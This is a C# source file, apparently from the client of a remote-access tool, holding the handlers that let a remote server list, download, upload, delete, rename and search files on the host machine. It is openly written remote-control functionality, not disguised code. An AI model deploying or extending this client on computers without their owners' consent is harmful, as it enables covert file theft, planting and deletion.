using System;
using System.IO;
using System.Security;
using System.Threading;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.Utilities;
using xClient.Enums;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */

    public static partial class CommandHandler
    {
        public static void HandleGetDirectory(Packets.ServerPackets.GetDirectory command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);

                FileInfo[] iFiles = dicInfo.GetFiles();
                DirectoryInfo[] iFolders = dicInfo.GetDirectories();

                string[] files = new string[iFiles.Length];
                long[] filessize = new long[iFiles.Length];
                string[] folders = new string[iFolders.Length];
                DateTime[] lastModificationDates = new DateTime[iFiles.Length + iFolders.Length];
                DateTime[] creationDates = new DateTime[iFiles.Length + iFolders.Length];

                int i = 0;
                foreach (FileInfo file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    lastModificationDates[i] = file.LastWriteTime;
                    creationDates[i] = file.CreationTime;
                    i++;
                }
                if (files.Length == 0)
                {
                    //files = new string[] {DELIMITER};
                    //filessize = new long[] {0};
                    lastModificationDates = new DateTime[] { DateTime.MinValue };
                    creationDates = new DateTime[] { DateTime.MinValue };
                }

                i = 0;
                foreach (DirectoryInfo folder in iFolders)
                {
                    folders[i] = folder.Name;
                    lastModificationDates[i + iFiles.Length] = folder.LastWriteTime;
                    creationDates[i + iFiles.Length] = folder.CreationTime;
                    i++;
                }
                if (folders.Length == 0)
                    folders = new string[] {DELIMITER};

                new Packets.ClientPackets.GetDirectoryResponse(files, folders, filessize, lastModificationDates,
                    creationDates).Execute(client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("GetDirectory No permission");
            }
            catch (SecurityException)
            {
                onError("GetDirectory No permission");
            }
            catch (PathTooLongException)
            {
                onError("GetDirectory Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("GetDirectory Directory not found");
            }
            catch (FileNotFoundException)
            {
                onError("GetDirectory File not found");
            }
            catch (IOException)
            {
                onError("GetDirectory I/O error");
            }
            catch (Exception)
            {
                onError("GetDirectory Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Packets.ClientPackets.SetStatusFileManager(message, true).Execute(client);
            }
        }

        public static void HandleDoDownloadFile(Packets.ServerPackets.DoDownloadFile command, Client client)
        {
            new Thread(() =>
            {
                _limitThreads.WaitOne();
                try
                {
                    FileSplit srcFile = new FileSplit(command.RemotePath);
                    if (srcFile.MaxBlocks < 0)
                        throw new Exception(srcFile.LastError);

                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                    {
                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID))
                            break;

                        byte[] block;

                        if (!srcFile.ReadBlock(currentBlock, out block))
                            throw new Exception(srcFile.LastError);

                        new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
                            Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                            srcFile.LastError).Execute(client);
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath),
                            new byte[0], -1, -1, ex.Message)
                        .Execute(client);
                }
                _limitThreads.Release();
            }).Start();
        }

        public static void HandleDoDownloadFileCancel(Packets.ServerPackets.DoDownloadFileCancel command, Client client)
        {
            if (!_canceledDownloads.ContainsKey(command.ID))
            {
                _canceledDownloads.Add(command.ID, "canceled");
                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled")
                    .Execute(client);
            }
        }

        public static void HandleDoUploadFile(Packets.ServerPackets.DoUploadFile command, Client client)
        {
            if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
                NativeMethods.DeleteFile(command.RemotePath); // delete existing file

            FileSplit destFile = new FileSplit(command.RemotePath);
            destFile.AppendBlock(command.Block, command.CurrentBlock);
        }

        public static void HandleDoPathDelete(Packets.ServerPackets.DoPathDelete command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                switch (command.PathType)
                {
                    case PathType.Directory:
                        Directory.Delete(command.Path, true);
                        new Packets.ClientPackets.SetStatusFileManager("Deleted directory", false).Execute(client);
                        break;
                    case PathType.File:
                        File.Delete(command.Path);
                        new Packets.ClientPackets.SetStatusFileManager("Deleted file", false).Execute(client);
                        break;
                }

                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.Path)), client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("DeletePath No permission");
            }
            catch (PathTooLongException)
            {
                onError("DeletePath Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("DeletePath Path not found");
            }
            catch (IOException)
            {
                onError("DeletePath I/O error");
            }
            catch (Exception)
            {
                onError("DeletePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Packets.ClientPackets.SetStatusFileManager(message, false).Execute(client);
            }
        }

        public static void HandleDoPathRename(Packets.ServerPackets.DoPathRename command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                switch (command.PathType)
                {
                    case PathType.Directory:
                        Directory.Move(command.Path, command.NewPath);
                        new Packets.ClientPackets.SetStatusFileManager("Renamed directory", false).Execute(client);
                        break;
                    case PathType.File:
                        File.Move(command.Path, command.NewPath);
                        new Packets.ClientPackets.SetStatusFileManager("Renamed file", false).Execute(client);
                        break;
                }

                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.NewPath)),
                    client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("RenamePath No permission");
            }
            catch (PathTooLongException)
            {
                onError("RenamePath Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("RenamePath Path not found");
            }
            catch (IOException)
            {
                onError("RenamePath I/O error");
            }
            catch (Exception)
            {
                onError("RenamePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Packets.ClientPackets.SetStatusFileManager(message, false).Execute(client);
            }
        }

        public static void HandleSearchDirectory(Packets.ServerPackets.SearchDirectory command, Client client)
        {
            switch (command.ActionType)
            {
                case ActionType.Begin:
                    new Packets.ClientPackets.SearchDirectoryResponse
                    {
                        Progress = SearchProgress.Starting
                    }.Execute(client);

                    _itemsFound = 0;
                    _searchThreadReset.Reset();
                    _searchTokenSource = new CancellationTokenSource();
                    Thread thr = new Thread(() =>
                    {
                        ThreadPool.QueueUserWorkItem(FileHelper.SearchDirectory, new FileHelper.SearchDirectoryQuery
                        {
                            Directory = command.BaseDirectory,
                            SearchString = command.SearchString,
                            Recursive = command.Recursive,
                            Action = iFiles =>
                            {
                                if (iFiles.Length == 0)
                                    return;

                                _itemsFound += iFiles.Length;
                                string[] files = new string[iFiles.Length];
                                long[] filessize = new long[iFiles.Length];
                                string[] folders = new string[iFiles.Length];
                                DateTime[] lastModificationDates = new DateTime[iFiles.Length];
                                DateTime[] creationDates = new DateTime[iFiles.Length];

                                for (int i = 0; i < iFiles.Length; i++)
                                {
                                    files[i] = iFiles[i].Name;
                                    filessize[i] = iFiles[i].Length;
                                    folders[i] = iFiles[i].DirectoryName;
                                    lastModificationDates[i] = iFiles[i].LastWriteTime;
                                    creationDates[i] = iFiles[i].CreationTime;
                                }

                                new Packets.ClientPackets.SearchDirectoryResponse(files, filessize, folders,
                                    lastModificationDates,
                                    creationDates, SearchProgress.Working).Execute(client);
                            },
                            Token = _searchTokenSource.Token,
                            Reset = _searchThreadReset,
                        });
                        _searchThreadReset.WaitOne(CalculateTimeout(command.Timeout, command.TimeoutType));
                        _searchTokenSource.Cancel();

                        new Packets.ClientPackets.SearchDirectoryResponse()
                        {
                            Progress = SearchProgress.Finished,
                            FilesSize = new long[] { _itemsFound } 
                        }.Execute(client);

                        _searchThreadReset.Reset();
                    });
                    thr.Start();
                    break;
                case ActionType.Pause:
                    break;
                case ActionType.Stop:
                    _searchTokenSource.Cancel();
                    _searchThreadReset.Reset();
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private static int CalculateTimeout(int timeout, TimeoutType type)
        {
            switch (type)
            {
                case TimeoutType.Milliseconds:
                    return timeout < -1 ? -1 : timeout;
                case TimeoutType.Seconds:
                    return timeout < -1 ? -1 : timeout * 1000;
                case TimeoutType.Minutes:
                    return timeout < -1 ? -1 : timeout * 60000;
                default:
                    return -1;
            }
        }
    }
}